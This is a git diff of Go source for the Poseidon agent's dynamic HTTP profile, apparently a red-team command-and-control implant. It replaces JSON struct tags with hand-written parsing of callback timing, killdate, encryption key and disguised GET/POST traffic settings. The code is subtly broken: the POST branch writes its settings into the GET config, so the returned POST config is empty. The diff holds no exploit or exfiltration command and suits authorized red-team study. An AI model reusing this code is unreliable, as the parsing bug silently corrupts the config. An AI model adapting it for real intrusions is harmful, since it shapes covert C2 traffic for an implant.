@@ -6,17 +6,16 @@ import (
 	"bytes"
 	"crypto/rsa"
 	"encoding/base64"
+	"encoding/json"
 	"errors"
+	"fmt"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
 	"io"
-	"net/url"
-	"os"
-
-	"encoding/json"
-	"fmt"
 	"math/rand"
 	"net/http"
+	"net/url"
+	"os"
 	"strconv"
 	"strings"
 	"time"
@@ -30,50 +29,176 @@ import (
 var dynamichttp_initial_config string
 
 type DynamicHTTPInitialConfig struct {
-	Killdate               string                `json:"killdate"`
-	Interval               uint                  `json:"callback_interval"`
-	Jitter                 uint                  `json:"callback_jitter"`
-	EncryptedExchangeCheck bool                  `json:"encrypted_exchange_check"`
-	AESPSK                 string                `json:"AESPSK"`
-	RawC2Config            C2DynamicHTTPC2Config `json:"raw_c2_config"`
+	Killdate               string
+	Interval               uint
+	Jitter                 uint
+	EncryptedExchangeCheck bool
+	AESPSK                 string
+	RawC2Config            C2DynamicHTTPC2Config
 }
+
+func (e *DynamicHTTPInitialConfig) parseC2DynamicHTTPFunction(configArray []interface{}) []C2DynamicHTTPFunction {
+	httpFunctions := make([]C2DynamicHTTPFunction, len(configArray))
+	for j, f := range configArray {
+		parameters := make([]string, len(f.(map[string]interface{})["parameters"].([]interface{})))
+		for k, p := range f.(map[string]interface{})["parameters"].([]interface{}) {
+			parameters[k] = p.(string)
+		}
+		httpFunctions[j] = C2DynamicHTTPFunction{
+			Function:   f.(map[string]interface{})["function"].(string),
+			Parameters: parameters,
+		}
+	}
+	return httpFunctions
+}
+func (e *DynamicHTTPInitialConfig) parseStringArray(configArray []interface{}) []string {
+	urls := make([]string, len(configArray))
+	for l, p := range configArray {
+		urls[l] = p.(string)
+	}
+	return urls
+}
+func (e *DynamicHTTPInitialConfig) parseMapStringString(configMap map[string]interface{}) map[string]string {
+	serverHeaders := make(map[string]string)
+	for j, k := range configMap {
+		serverHeaders[j] = k.(string)
+	}
+	return serverHeaders
+}
+func (e *DynamicHTTPInitialConfig) parseC2DynamicHTTPModifyBlock(configArray []interface{}) []C2DynamicHTTPModifyBlock {
+	httpModifyBlocks := make([]C2DynamicHTTPModifyBlock, len(configArray))
+	for j, f := range configArray {
+		httpModifyBlocks[j] = C2DynamicHTTPModifyBlock{}
+		httpModifyBlocks[j].Name = f.(map[string]interface{})["name"].(string)
+		httpModifyBlocks[j].Value = f.(map[string]interface{})["value"].(string)
+		httpModifyBlocks[j].Transforms = e.parseC2DynamicHTTPFunction(f.(map[string]interface{})["transforms"].([]interface{}))
+	}
+	return httpModifyBlocks
+}
+func (e *DynamicHTTPInitialConfig) parseRawC2Config(configMap map[string]interface{}) C2DynamicHTTPC2Config {
+	RawC2Config := C2DynamicHTTPC2Config{}
+	getConfig := C2DynamicHTTPAgentConfig{}
+	postConfig := C2DynamicHTTPAgentConfig{}
+
+	get := configMap["GET"].(map[string]interface{})
+	post := configMap["POST"].(map[string]interface{})
+	if g, ok := get["ServerHeaders"]; ok {
+		getConfig.ServerHeaders = e.parseMapStringString(g.(map[string]interface{}))
+	}
+	if g, ok := get["ServerCookies"]; ok {
+		getConfig.ServerCookies = e.parseMapStringString(g.(map[string]interface{}))
+	}
+	if g, ok := get["ServerBody"]; ok {
+		getConfig.ServerBody = e.parseC2DynamicHTTPFunction(g.([]interface{}))
+	}
+	if g, ok := get["AgentMessage"]; ok {
+		agentMessages := make([]C2DynamicHTTPAgentMessage, len(g.([]interface{})))
+		for j, k := range g.([]interface{}) {
+			messageInterface := k.(map[string]interface{})
+			agentMessages[j] = C2DynamicHTTPAgentMessage{}
+			agentMessages[j].AgentHeaders = e.parseMapStringString(messageInterface["AgentHeaders"].(map[string]interface{}))
+			agentMessages[j].URI = messageInterface["uri"].(string)
+			agentMessages[j].URLs = e.parseStringArray(messageInterface["urls"].([]interface{}))
+			agentMessages[j].Body = e.parseC2DynamicHTTPFunction(messageInterface["Body"].([]interface{}))
+			agentMessages[j].Cookies = e.parseC2DynamicHTTPModifyBlock(messageInterface["Cookies"].([]interface{}))
+			agentMessages[j].URLFunctions = e.parseC2DynamicHTTPModifyBlock(messageInterface["urlFunctions"].([]interface{}))
+			agentMessages[j].QueryParameters = e.parseC2DynamicHTTPModifyBlock(messageInterface["QueryParameters"].([]interface{}))
+		}
+		getConfig.AgentMessage = agentMessages
+	}
+
+	if g, ok := post["ServerHeaders"]; ok {
+		getConfig.ServerHeaders = e.parseMapStringString(g.(map[string]interface{}))
+	}
+	if g, ok := post["ServerCookies"]; ok {
+		getConfig.ServerCookies = e.parseMapStringString(g.(map[string]interface{}))
+	}
+	if g, ok := post["ServerBody"]; ok {
+		getConfig.ServerBody = e.parseC2DynamicHTTPFunction(g.([]interface{}))
+	}
+	if g, ok := post["AgentMessage"]; ok {
+		agentMessages := make([]C2DynamicHTTPAgentMessage, len(g.([]interface{})))
+		for j, k := range g.([]interface{}) {
+			messageInterface := k.(map[string]interface{})
+			agentMessages[j] = C2DynamicHTTPAgentMessage{}
+			agentMessages[j].AgentHeaders = e.parseMapStringString(messageInterface["AgentHeaders"].(map[string]interface{}))
+			agentMessages[j].URI = messageInterface["uri"].(string)
+			agentMessages[j].URLs = e.parseStringArray(messageInterface["urls"].([]interface{}))
+			agentMessages[j].Body = e.parseC2DynamicHTTPFunction(messageInterface["Body"].([]interface{}))
+			agentMessages[j].Cookies = e.parseC2DynamicHTTPModifyBlock(messageInterface["Cookies"].([]interface{}))
+			agentMessages[j].URLFunctions = e.parseC2DynamicHTTPModifyBlock(messageInterface["urlFunctions"].([]interface{}))
+			agentMessages[j].QueryParameters = e.parseC2DynamicHTTPModifyBlock(messageInterface["QueryParameters"].([]interface{}))
+		}
+		getConfig.AgentMessage = agentMessages
+	}
+	RawC2Config.Get = getConfig
+	RawC2Config.Post = postConfig
+	return RawC2Config
+}
+func (e *DynamicHTTPInitialConfig) UnmarshalJSON(data []byte) error {
+	alias := map[string]interface{}{}
+	err := json.Unmarshal(data, &alias)
+	if err != nil {
+		return err
+	}
+	if v, ok := alias["killdate"]; ok {
+		e.Killdate = v.(string)
+	}
+	if v, ok := alias["callback_interval"]; ok {
+		e.Interval = uint(v.(float64))
+	}
+	if v, ok := alias["callback_jitter"]; ok {
+		e.Jitter = uint(v.(float64))
+	}
+	if v, ok := alias["encrypted_exchange_check"]; ok {
+		e.EncryptedExchangeCheck = v.(bool)
+	}
+	if v, ok := alias["AESPSK"]; ok {
+		e.AESPSK = v.(string)
+	}
+	if v, ok := alias["raw_c2_config"]; ok {
+		e.RawC2Config = e.parseRawC2Config(v.(map[string]interface{}))
+	}
+	return nil
+}
+
 type C2DynamicHTTPFunction struct {
-	Function   string   `json:"function"`
-	Parameters []string `json:"parameters"`
+	Function   string
+	Parameters []string
 }
 type C2DynamicHTTPModifyBlock struct {
-	Name       string                  `json:"name"`
-	Value      string                  `json:"value"`
-	Transforms []C2DynamicHTTPFunction `json:"transforms"`
+	Name       string
+	Value      string
+	Transforms []C2DynamicHTTPFunction
 }
 type C2DynamicHTTPAgentMessage struct {
-	URLs            []string                   `json:"urls"`
-	URI             string                     `json:"uri"`
-	URLFunctions    []C2DynamicHTTPModifyBlock `json:"urlFunctions"`
-	AgentHeaders    map[string]string          `json:"AgentHeaders"`
-	QueryParameters []C2DynamicHTTPModifyBlock `json:"QueryParameters"`
-	Cookies         []C2DynamicHTTPModifyBlock `json:"Cookies"`
-	Body            []C2DynamicHTTPFunction    `json:"Body"`
+	URLs            []string
+	URI             string
+	URLFunctions    []C2DynamicHTTPModifyBlock
+	AgentHeaders    map[string]string
+	QueryParameters []C2DynamicHTTPModifyBlock
+	Cookies         []C2DynamicHTTPModifyBlock
+	Body            []C2DynamicHTTPFunction
 }
 type C2DynamicHTTPAgentConfig struct {
-	ServerBody    []C2DynamicHTTPFunction     `json:"ServerBody"`
-	ServerHeaders map[string]string           `json:"ServerHeaders"`
-	ServerCookies map[string]string           `json:"ServerCookies"`
-	AgentMessage  []C2DynamicHTTPAgentMessage `json:"AgentMessage"`
+	ServerBody    []C2DynamicHTTPFunction
+	ServerHeaders map[string]string
+	ServerCookies map[string]string
+	AgentMessage  []C2DynamicHTTPAgentMessage
 }
 type C2DynamicHTTPC2Config struct {
-	Get  C2DynamicHTTPAgentConfig `json:"GET"`
-	Post C2DynamicHTTPAgentConfig `json:"POST"`
+	Get  C2DynamicHTTPAgentConfig
+	Post C2DynamicHTTPAgentConfig
 }
 type C2DynamicHTTP struct {
-	Interval       int       `json:"interval"`
-	Jitter         int       `json:"jitter"`
-	Killdate       time.Time `json:"kill_date"`
+	Interval       int
+	Jitter         int
+	Killdate       time.Time
 	ExchangingKeys bool
-	ChunkSize      int `json:"chunk_size"`
+	ChunkSize      int
 	// internally set pieces
-	Config                C2DynamicHTTPC2Config `json:"config"`
-	Key                   string                `json:"encryption_key"`
+	Config                C2DynamicHTTPC2Config
+	Key                   string
 	RsaPrivateKey         *rsa.PrivateKey
 	ShouldStop            bool
 	stoppedChannel        chan bool
